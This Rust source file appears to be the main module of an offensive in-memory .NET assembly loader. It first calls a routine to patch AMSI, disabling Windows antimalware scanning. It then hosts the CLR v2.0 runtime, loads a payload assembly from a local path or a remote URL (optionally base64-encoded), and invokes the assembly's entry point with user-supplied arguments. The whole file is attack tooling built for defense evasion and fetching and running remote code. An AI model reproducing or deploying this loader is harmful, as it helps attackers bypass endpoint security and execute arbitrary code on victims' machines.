mod clr;
mod commandline;
mod file;
mod patch;

use clap::Parser;
use clr::util;
use file::{get_payload_from_filesystem, get_payload_from_url};

//const CLR_VERSION: &str = "v4.0.30319";
const CLR_VERSION: &str = "v2.0.50727";

fn main() {
    if let Err(e) = patch::patch_amsi() {
        eprintln!("{e}");
        return;
    };

    let commandline = commandline::CommandLine::parse();

    let installed_versions = util::get_installed_runtime_versions();

    let is_expected_version = installed_versions.contains_key(CLR_VERSION);
    if !is_expected_version {
        println!("Expected CLR version is not installed.");
        return;
    }

    let cor_runtime_host = clr::runtime_host::CLRRuntimeHost::from(
        installed_versions.get(CLR_VERSION).unwrap().clone(),
    );

    let appdomain = cor_runtime_host.create_domain();

    let buf = if commandline.path.is_some() {
        get_payload_from_filesystem(commandline.path.unwrap())
    } else if commandline.path_b64.is_some() {
        get_payload_from_filesystem(commandline.path_b64.unwrap())
    } else if commandline.url.is_some() {
        get_payload_from_url(commandline.url.unwrap())
    } else if commandline.url_b64.is_some() {
        get_payload_from_url(commandline.url_b64.unwrap())
    } else {
        vec![]
    };

    let assembly = appdomain.load_assembly(&buf);
    let entrypoint = assembly.get_entrypoint();
    entrypoint.invoke(&commandline.derive_command);
}
